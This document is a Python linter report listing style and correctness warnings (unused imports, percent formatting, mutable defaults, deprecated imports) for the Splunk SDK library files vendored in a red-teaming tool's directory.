    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:3068:12
     |
3066 |         :return: The :class:`Job`.
3067 |         """
3068 |         if kwargs.get("exec_mode", None) == "oneshot":
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3069 |             raise TypeError(
3070 |                 "Cannot specify exec_mode=oneshot; use the oneshot method instead."
     |
help: Replace `kwargs.get("exec_mode", None)` with `kwargs.get("exec_mode")`

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:3520:30
     |
3518 |         """
3519 |         if not isinstance(username, six.string_types):
3520 |             raise ValueError("Invalid username: %s" % str(username))
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3521 |         username = username.lower()
3522 |         self.post(name=username, password=password, roles=roles, **params)
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:3643:30
     |
3641 |         """
3642 |         if not isinstance(name, six.string_types):
3643 |             raise ValueError("Invalid role name: %s" % str(name))
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3644 |         name = name.lower()
3645 |         self.post(name=name, **params)
     |
help: Replace with format specifiers

B006 Do not use mutable data structures for argument defaults
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:3693:36
     |
3691 |         )
3692 |
3693 |     def create(self, name, indexes={}, fields={}, **kwargs):
     |                                    ^^
3694 |         """Creates a KV Store Collection.
     |
help: Replace with `None`; initialize within function

B006 Do not use mutable data structures for argument defaults
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:3693:47
     |
3691 |         )
3692 |
3693 |     def create(self, name, indexes={}, fields={}, **kwargs):
     |                                               ^^
3694 |         """Creates a KV Store Collection.
     |
help: Replace with `None`; initialize within function

F821 Undefined name `basestring`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:3737:40
     |
3735 |         kwargs = {}
3736 |         kwargs["index." + name] = (
3737 |             value if isinstance(value, basestring) else json.dumps(value)
     |                                        ^^^^^^^^^^
3738 |         )
3739 |         return self.post(**kwargs)
     |

UP004 [*] Class `KVStoreCollectionData` inherits from `object`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:3756:29
     |
3756 | class KVStoreCollectionData(object):
     |                             ^^^^^^
3757 |     """This class represents the data endpoint for a KVStoreCollection.
     |
help: Remove `object` inheritance

W291 Trailing whitespace
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\data.py:15:79
   |
13 | # under the License.
14 |
15 | """The **splunklib.data** module reads the responses from splunkd in Atom Feed 
   |                                                                               ^
16 | format, which is the format used by most of the REST API.
17 | """
   |
help: Remove trailing whitespace

UP010 [*] Unnecessary `__future__` import `absolute_import` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\data.py:19:1
   |
17 | """
18 |
19 | from __future__ import absolute_import
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
20 |
21 | import sys
   |
help: Remove unnecessary `__future__` import

SIM109 Use `name in (XNAME_DICT, LNAME_DICT)` instead of multiple equality comparisons
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\data.py:46:12
   |
45 | def isdict(name):
46 |     return name == XNAME_DICT or name == LNAME_DICT
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |
help: Replace with `name in (XNAME_DICT, LNAME_DICT)`

SIM109 Use `name in (XNAME_ITEM, LNAME_ITEM)` instead of multiple equality comparisons
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\data.py:50:12
   |
49 | def isitem(name):
50 |     return name == XNAME_ITEM or name == LNAME_ITEM
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |
help: Replace with `name in (XNAME_ITEM, LNAME_ITEM)`

SIM109 Use `name in (XNAME_KEY, LNAME_KEY)` instead of multiple equality comparisons
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\data.py:54:12
   |
53 | def iskey(name):
54 |     return name == XNAME_KEY or name == LNAME_KEY
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |
help: Replace with `name in (XNAME_KEY, LNAME_KEY)`

SIM109 Use `name in (XNAME_LIST, LNAME_LIST)` instead of multiple equality comparisons
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\data.py:58:12
   |
57 | def islist(name):
58 |     return name == XNAME_LIST or name == LNAME_LIST
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |
help: Replace with `name in (XNAME_LIST, LNAME_LIST)`

F821 Undefined name `unicode`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\data.py:90:58
   |
89 |     # Convert to unicode encoding in only python 2 for xml parser
90 |     if sys.version_info < (3, 0, 0) and isinstance(text, unicode):
   |                                                          ^^^^^^^
91 |         text = text.encode("utf-8")
   |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\data.py:243:13
    |
241 |             return self[name]
242 |         except KeyError:
243 |             raise AttributeError(name)
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^
244 |
245 |     def __delattr__(self, name):
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\data.py:277:28
    |
275 |                 result[suffix] = v
276 |         if len(result) == 0:
277 |             raise KeyError("No key or prefix: %s" % key)
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
278 |         return result
    |
help: Replace with format specifiers

F401 `.argument.Argument` imported but unused; consider removing, adding to `__all__`, or using a redundant alias
 --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\__init__.py:7:23
  |
5 | """
6 |
7 | from .argument import Argument
  |                       ^^^^^^^^
8 | from .event import Event
9 | from .event_writer import EventWriter
  |
help: Use an explicit re-export: `Argument as Argument`

F401 `.event.Event` imported but unused; consider removing, adding to `__all__`, or using a redundant alias
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\__init__.py:8:20
   |
 7 | from .argument import Argument
 8 | from .event import Event
   |                    ^^^^^
 9 | from .event_writer import EventWriter
10 | from .input_definition import InputDefinition
   |
help: Use an explicit re-export: `Event as Event`

F401 `.event_writer.EventWriter` imported but unused; consider removing, adding to `__all__`, or using a redundant alias
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\__init__.py:9:27
   |
 7 | from .argument import Argument
 8 | from .event import Event
 9 | from .event_writer import EventWriter
   |                           ^^^^^^^^^^^
10 | from .input_definition import InputDefinition
11 | from .scheme import Scheme
   |
help: Use an explicit re-export: `EventWriter as EventWriter`

F401 `.input_definition.InputDefinition` imported but unused; consider removing, adding to `__all__`, or using a redundant alias
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\__init__.py:10:31
   |
 8 | from .event import Event
 9 | from .event_writer import EventWriter
10 | from .input_definition import InputDefinition
   |                               ^^^^^^^^^^^^^^^
11 | from .scheme import Scheme
12 | from .script import Script
   |
help: Use an explicit re-export: `InputDefinition as InputDefinition`

F401 `.scheme.Scheme` imported but unused; consider removing, adding to `__all__`, or using a redundant alias
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\__init__.py:11:21
   |
 9 | from .event_writer import EventWriter
10 | from .input_definition import InputDefinition
11 | from .scheme import Scheme
   |                     ^^^^^^
12 | from .script import Script
13 | from .validation_definition import ValidationDefinition
   |
help: Use an explicit re-export: `Scheme as Scheme`

F401 `.script.Script` imported but unused; consider removing, adding to `__all__`, or using a redundant alias
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\__init__.py:12:21
   |
10 | from .input_definition import InputDefinition
11 | from .scheme import Scheme
12 | from .script import Script
   |                     ^^^^^^
13 | from .validation_definition import ValidationDefinition
   |
help: Use an explicit re-export: `Script as Script`

F401 `.validation_definition.ValidationDefinition` imported but unused; consider removing, adding to `__all__`, or using a redundant alias
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\__init__.py:13:36
   |
11 | from .scheme import Scheme
12 | from .script import Script
13 | from .validation_definition import ValidationDefinition
   |                                    ^^^^^^^^^^^^^^^^^^^^
   |
help: Use an explicit re-export: `ValidationDefinition as ValidationDefinition`

UP010 [*] Unnecessary `__future__` import `absolute_import` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\argument.py:15:1
   |
13 | # under the License.
14 |
15 | from __future__ import absolute_import
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
16 |
17 | try:
   |
help: Remove unnecessary `__future__` import

UP023 [*] `cElementTree` is deprecated, use `ElementTree`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\argument.py:20:12
   |
18 |     import xml.etree.ElementTree as ET
19 | except ImportError:
20 |     import xml.etree.cElementTree as ET
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |
help: Replace with `ElementTree`

N817 CamelCase `cElementTree` imported as acronym `ET`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\argument.py:20:12
   |
18 |     import xml.etree.ElementTree as ET
19 | except ImportError:
20 |     import xml.etree.cElementTree as ET
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP004 [*] Class `Argument` inherits from `object`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\argument.py:23:16
   |
23 | class Argument(object):
   |                ^^^^^^
24 |     """Class representing an argument to a modular input kind.
   |
help: Remove `object` inheritance

UP010 [*] Unnecessary `__future__` import `absolute_import` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\event.py:15:1
   |
13 | # under the License.
14 |
15 | from __future__ import absolute_import
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
16 |
17 | try:
   |
help: Remove unnecessary `__future__` import

UP023 [*] `cElementTree` is deprecated, use `ElementTree`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\event.py:18:12
   |
17 | try:
18 |     import xml.etree.cElementTree as ET
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
19 | except ImportError as ie:
20 |     import xml.etree.ElementTree as ET
   |
help: Replace with `ElementTree`

N817 CamelCase `cElementTree` imported as acronym `ET`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\event.py:18:12
   |
17 | try:
18 |     import xml.etree.cElementTree as ET
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
19 | except ImportError as ie:
20 |     import xml.etree.ElementTree as ET
   |

F841 [*] Local variable `ie` is assigned to but never used
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\event.py:19:23
   |
17 | try:
18 |     import xml.etree.cElementTree as ET
19 | except ImportError as ie:
   |                       ^^
20 |     import xml.etree.ElementTree as ET
   |
help: Remove assignment to unused variable `ie`

UP004 [*] Class `Event` inherits from `object`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\event.py:23:13
   |
23 | class Event(object):
   |             ^^^^^^
24 |     """Represents an event or fragment of an event to be written by this modular input to Splunk.
   |
help: Remove `object` inheritance

UP010 [*] Unnecessary `__future__` import `absolute_import` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\event_writer.py:15:1
   |
13 | # under the License.
14 |
15 | from __future__ import absolute_import
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
16 |
17 | import sys
   |
help: Remove unnecessary `__future__` import

F401 [*] `splunklib.six.StringIO` imported but unused
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\event_writer.py:24:31
   |
22 |     from splunklib.six.moves import cStringIO as StringIO
23 | except ImportError:
24 |     from splunklib.six import StringIO
   |                               ^^^^^^^^
   |
help: Remove unused import: `splunklib.six.StringIO`

UP004 [*] Class `EventWriter` inherits from `object`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\event_writer.py:27:19
   |
27 | class EventWriter(object):
   |                   ^^^^^^
28 |     """``EventWriter`` writes events and error messages to Splunk from a modular input.
   |
help: Remove `object` inheritance

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\event_writer.py:73:26
   |
71 |         """
72 |
73 |         self._err.write(("%s %s\n" % (severity, message)).encode("utf-8"))
   |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
74 |         self._err.flush()
   |
help: Replace with format specifiers

UP010 [*] Unnecessary `__future__` import `absolute_import` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\input_definition.py:15:1
   |
13 | # under the License.
14 |
15 | from __future__ import absolute_import
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
16 |
17 | try:
   |
help: Remove unnecessary `__future__` import

UP023 [*] `cElementTree` is deprecated, use `ElementTree`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\input_definition.py:18:12
   |
17 | try:
18 |     import xml.etree.cElementTree as ET
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
19 | except ImportError as ie:
20 |     import xml.etree.ElementTree as ET
   |
help: Replace with `ElementTree`

N817 CamelCase `cElementTree` imported as acronym `ET`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\input_definition.py:18:12
   |
17 | try:
18 |     import xml.etree.cElementTree as ET
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
19 | except ImportError as ie:
20 |     import xml.etree.ElementTree as ET
   |

F841 [*] Local variable `ie` is assigned to but never used
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\input_definition.py:19:23
   |
17 | try:
18 |     import xml.etree.cElementTree as ET
19 | except ImportError as ie:
   |                       ^^
20 |     import xml.etree.ElementTree as ET
   |
help: Remove assignment to unused variable `ie`

UP010 [*] Unnecessary `__future__` import `absolute_import` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\scheme.py:15:1
   |
13 | # under the License.
14 |
15 | from __future__ import absolute_import
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
16 |
17 | try:
   |
help: Remove unnecessary `__future__` import

UP023 [*] `cElementTree` is deprecated, use `ElementTree`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\scheme.py:18:12
   |
17 | try:
18 |     import xml.etree.cElementTree as ET
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
19 | except ImportError:
20 |     import xml.etree.ElementTree as ET
   |
help: Replace with `ElementTree`

N817 CamelCase `cElementTree` imported as acronym `ET`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\scheme.py:18:12
   |
17 | try:
18 |     import xml.etree.cElementTree as ET
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
19 | except ImportError:
20 |     import xml.etree.ElementTree as ET
   |

UP004 [*] Class `Scheme` inherits from `object`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\scheme.py:23:14
   |
23 | class Scheme(object):
   |              ^^^^^^
24 |     """Class representing the metadata for a modular input kind.
   |
help: Remove `object` inheritance

UP010 [*] Unnecessary `__future__` import `absolute_import` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\script.py:15:1
   |
13 | # under the License.
14 |
15 | from __future__ import absolute_import
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
16 |
17 | import sys
   |
help: Remove unnecessary `__future__` import

UP023 [*] `cElementTree` is deprecated, use `ElementTree`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\script.py:29:12
   |
28 | try:
29 |     import xml.etree.cElementTree as ET
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
30 | except ImportError:
31 |     import xml.etree.ElementTree as ET
   |
help: Replace with `ElementTree`

N817 CamelCase `cElementTree` imported as acronym `ET`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\script.py:29:12
   |
28 | try:
29 |     import xml.etree.cElementTree as ET
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
30 | except ImportError:
31 |     import xml.etree.ElementTree as ET
   |

UP010 [*] Unnecessary `__future__` import `absolute_import` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\utils.py:17:1
   |
15 | # File for utility functions
16 |
17 | from __future__ import absolute_import
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
18 |
19 | from splunklib.six.moves import zip
   |
help: Remove unnecessary `__future__` import

C419 Unnecessary list comprehension
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\utils.py:45:16
   |
44 |     # compare children
45 |     if not all([xml_compare(a, b) for a, b in zip(expected_children, found_children)]):
   |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
46 |         return False
   |
help: Remove unnecessary comprehension

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\utils.py:71:13
   |
69 |     else:
70 |         raise ValueError(
71 |             "Invalid configuration scheme, %s tag unexpected." % param_node.tag
   |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
72 |         )
   |
help: Replace with format specifiers

SIM300 [*] Yoda condition detected
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\utils.py:83:14
   |
81 |                 for param in child:
82 |                     data[child.get("name")][param.get("name")] = parse_parameters(param)
83 |         elif "item" == parent_node.tag:
   |              ^^^^^^^^^^^^^^^^^^^^^^^^^
84 |             data[child.get("name")] = parse_parameters(child)
85 |     return data
   |
help: Rewrite as `parent_node.tag == "item"`

UP010 [*] Unnecessary `__future__` import `absolute_import` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\validation_definition.py:16:1
   |
16 | from __future__ import absolute_import
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
17 |
18 | try:
   |
help: Remove unnecessary `__future__` import

UP023 [*] `cElementTree` is deprecated, use `ElementTree`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\validation_definition.py:19:12
   |
18 | try:
19 |     import xml.etree.cElementTree as ET
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
20 | except ImportError as ie:
21 |     import xml.etree.ElementTree as ET
   |
help: Replace with `ElementTree`

N817 CamelCase `cElementTree` imported as acronym `ET`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\validation_definition.py:19:12
   |
18 | try:
19 |     import xml.etree.cElementTree as ET
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
20 | except ImportError as ie:
21 |     import xml.etree.ElementTree as ET
   |

F841 [*] Local variable `ie` is assigned to but never used
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\validation_definition.py:20:23
   |
18 | try:
19 |     import xml.etree.cElementTree as ET
20 | except ImportError as ie:
   |                       ^^
21 |     import xml.etree.ElementTree as ET
   |
help: Remove assignment to unused variable `ie`

UP004 [*] Class `ValidationDefinition` inherits from `object`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\modularinput\validation_definition.py:26:28
   |
26 | class ValidationDefinition(object):
   |                            ^^^^^^
27 |     """This class represents the XML sent by Splunk for external validation of a
28 |     new modular input.
   |
help: Remove `object` inheritance

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\ordereddict.py:30:29
   |
28 |     def __init__(self, *args, **kwds):
29 |         if len(args) > 1:
30 |             raise TypeError("expected at most 1 arguments, got %d" % len(args))
   |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
31 |         try:
32 |             self.__end
   |
help: Replace with format specifiers

B018 Found useless expression. Either assign it to a variable or remove it.
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\ordereddict.py:32:13
   |
30 |             raise TypeError("expected at most 1 arguments, got %d" % len(args))
31 |         try:
32 |             self.__end
   |             ^^^^^^^^^^
33 |         except AttributeError:
34 |             self.clear()
   |

SIM108 Use ternary operator `key = reversed(self).next() if last else iter(self).next()` instead of `if`-`else`-block
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\ordereddict.py:73:9
   |
71 |           if not self:
72 |               raise KeyError("dictionary is empty")
73 | /         if last:
74 | |             key = reversed(self).next()
75 | |         else:
76 | |             key = iter(self).next()
   | |___________________________________^
77 |           value = self.pop(key)
78 |           return key, value
   |
help: Replace `if`-`else`-block with `key = reversed(self).next() if last else iter(self).next()`

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\ordereddict.py:104:20
    |
102 |     def __repr__(self):
103 |         if not self:
104 |             return "%s()" % (self.__class__.__name__,)
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
105 |         return "%s(%r)" % (self.__class__.__name__, self.items())
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\ordereddict.py:105:16
    |
103 |         if not self:
104 |             return "%s()" % (self.__class__.__name__,)
105 |         return "%s(%r)" % (self.__class__.__name__, self.items())
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
106 |
107 |     def copy(self):
    |
help: Replace with format specifiers

SIM110 Use `return all(p == q for p, q in zip(self.items(), other.items()))` instead of `for` loop
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\ordereddict.py:121:13
    |
119 |               if len(self) != len(other):
120 |                   return False
121 | /             for p, q in zip(self.items(), other.items()):
122 | |                 if p != q:
123 | |                     return False
124 | |             return True
    | |_______________________^
125 |           return dict.__eq__(self, other)
    |
help: Replace with `return all(p == q for p, q in zip(self.items(), other.items()))`

B905 `zip()` without an explicit `strict=` parameter
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\ordereddict.py:121:25
    |
119 |             if len(self) != len(other):
120 |                 return False
121 |             for p, q in zip(self.items(), other.items()):
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
122 |                 if p != q:
123 |                     return False
    |
help: Add explicit value for parameter `strict=`

UP010 [*] Unnecessary `__future__` import `absolute_import` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\results.py:35:1
   |
33 | """
34 |
35 | from __future__ import absolute_import
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
36 |
37 | from io import BytesIO
   |
help: Remove unnecessary `__future__` import

UP023 [*] `cElementTree` is deprecated, use `ElementTree`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\results.py:42:12
   |
41 | try:
42 |     import xml.etree.cElementTree as et
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
43 | except:
44 |     import xml.etree.ElementTree as et
   |
help: Replace with `ElementTree`

N813 Camelcase `cElementTree` imported as lowercase `et`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\results.py:42:12
   |
41 | try:
42 |     import xml.etree.cElementTree as et
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
43 | except:
44 |     import xml.etree.ElementTree as et
   |

E722 Do not use bare `except`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\results.py:43:1
   |
41 | try:
42 |     import xml.etree.cElementTree as et
43 | except:
   | ^^^^^^
44 |     import xml.etree.ElementTree as et
   |

N813 Camelcase `ElementTree` imported as lowercase `et`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\results.py:44:12
   |
42 |     import xml.etree.cElementTree as et
43 | except:
44 |     import xml.etree.ElementTree as et
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^
45 |
46 | try:
   |

E722 Do not use bare `except`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\results.py:53:1
   |
51 | try:
52 |     from splunklib.six.moves import cStringIO as StringIO
53 | except:
   | ^^^^^^
54 |     from splunklib.six import StringIO
   |

F401 [*] `splunklib.six.StringIO` imported but unused
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\results.py:54:31
   |
52 |     from splunklib.six.moves import cStringIO as StringIO
53 | except:
54 |     from splunklib.six import StringIO
   |                               ^^^^^^^^
55 |
56 | __all__ = ["ResultsReader", "Message"]
   |
help: Remove unused import: `splunklib.six.StringIO`

UP004 [*] Class `Message` inherits from `object`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\results.py:59:15
   |
59 | class Message(object):
   |               ^^^^^^
60 |     """This class represents informational messages that Splunk interleaves in the results stream.
   |
help: Remove `object` inheritance

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\results.py:75:16
   |
74 |     def __repr__(self):
75 |         return "%s: %s" % (self.type, self.message)
   |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
76 |
77 |     def __eq__(self, other):
   |
help: Replace with format specifiers

UP004 [*] Class `_ConcatenatedStream` inherits from `object`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\results.py:84:27
   |
84 | class _ConcatenatedStream(object):
   |                           ^^^^^^
85 |     """Lazily concatenate zero or more streams into a stream.
   |
help: Remove `object` inheritance

UP004 [*] Class `_XMLDTDFilter` inherits from `object`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\results.py:116:21
    |
116 | class _XMLDTDFilter(object):
    |                     ^^^^^^
117 |     """Lazily remove all XML DTDs from a stream.
    |
help: Remove `object` inheritance

UP004 [*] Class `ResultsReader` inherits from `object`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\results.py:161:21
    |
161 | class ResultsReader(object):
    |                     ^^^^^^
162 |     """This class returns dictionaries and Splunk messages from an XML results
163 |     stream.
    |
help: Remove `object` inheritance

UP028 Replace `yield` over `for` loop with `yield from`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\results.py:278:33
    |
276 |   ΓÇª                         yield self.text
277 |   ΓÇª                     for e in self:
278 | / ΓÇª                         for s in __itertext(e):
279 | | ΓÇª                             yield s
    | |_____________________________________^
280 |   ΓÇª                         if e.tail:
281 |   ΓÇª                             yield e.tail
    |
help: Replace with `yield from`

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\__init__.py:1:1
  |
1 | # coding=utf-8
  | ^^^^^^^^^^^^^^
2 | #
3 | # Copyright ┬⌐ 2011-2015 Splunk, Inc.
  |
help: Remove unnecessary coding comment

UP010 [*] Unnecessary `__future__` imports `absolute_import`, `division`, `print_function`, `unicode_literals` for target Python version
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\__init__.py:143:1
    |
141 | """
142 |
143 | from __future__ import absolute_import, division, print_function, unicode_literals
    | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
144 |
145 | from .decorators import *
    |
help: Remove unnecessary `__future__` import

F403 `from .decorators import *` used; unable to detect undefined names
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\__init__.py:145:1
    |
143 | from __future__ import absolute_import, division, print_function, unicode_literals
144 |
145 | from .decorators import *
    | ^^^^^^^^^^^^^^^^^^^^^^^^^
146 | from .environment import *
147 | from .eventing_command import EventingCommand
    |

